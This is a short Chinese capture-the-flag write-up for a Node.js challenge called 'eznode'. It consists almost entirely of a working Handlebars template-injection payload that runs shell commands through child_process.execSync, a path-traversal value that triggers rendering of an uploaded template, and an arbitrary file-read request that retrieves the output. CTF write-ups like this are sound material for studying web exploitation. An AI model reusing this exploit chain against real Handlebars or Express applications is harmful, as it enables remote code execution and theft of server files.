[eznode 杭州师范大学第四届网络与信息安全竞赛官方 WriteUp](https://mp.weixin.qq.com/s/DJp-Kq0dIDqx0LP6KiGHZw)

## 模板注入

nodeisgood
模板注入可以利用如下构造到命令执行

```h
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('/readflag / > /tmp/res');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

触发模板渲染的构造可以如下

```js
{"name": {"layout": "./../../../../../../../../../../../tmp/nodeisgood.tmp"}}
```

利用任意文件读取拿到结果，文件读取如下

```js
/read?read[href]=a&read[origin]=a&read[protocol]=file:&read[hostname]=&read[pathname]=/tmp/res
```

实际writeup

先用  http://xxxunqiu.com:3000/upload API上传模版文件到服务器..

然后get请求发送,进行模板渲染.
GET http://xxxunqiu.com:3000/read?read=./../../../../../../../../../../../tmp/nodeisgood.tmp

再用get请求读取flag
GET http://xxxxunqiu.com:3000/read?read=./../../../../../../../../../../../tmp/res

